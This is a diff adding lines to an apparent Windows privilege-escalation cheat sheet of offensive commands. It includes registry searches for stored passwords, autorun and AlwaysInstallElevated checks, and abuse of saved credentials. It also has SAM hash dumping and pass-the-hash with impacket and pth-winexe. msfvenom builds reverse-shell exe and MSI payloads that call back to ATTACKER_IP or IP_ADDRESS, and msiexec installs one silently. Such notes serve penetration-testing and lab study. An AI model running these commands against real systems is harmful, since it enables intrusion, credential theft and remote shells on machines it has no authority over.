@@ -135,6 +135,8 @@ View saved credentials:
 cmdkey /list
 ( to use creds )
 runas /savecred /user:admin cmd.exe
+Search registry for passwords:
+reg query HKLM /f password /t REG_SZ /s
 
 Generate malicious exe:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
@@ -151,6 +153,15 @@ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 Pass the hash:
 impacket-psexec -hashes HASH USER@IP_ADDRESS
 pth-winexe -U 'username%hash' //MACHINE_IP cmd.exe
+
+Check Autorun:
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+AlwaysInstallElevated:
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=53 -f msi -o reverse.msi
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 
 
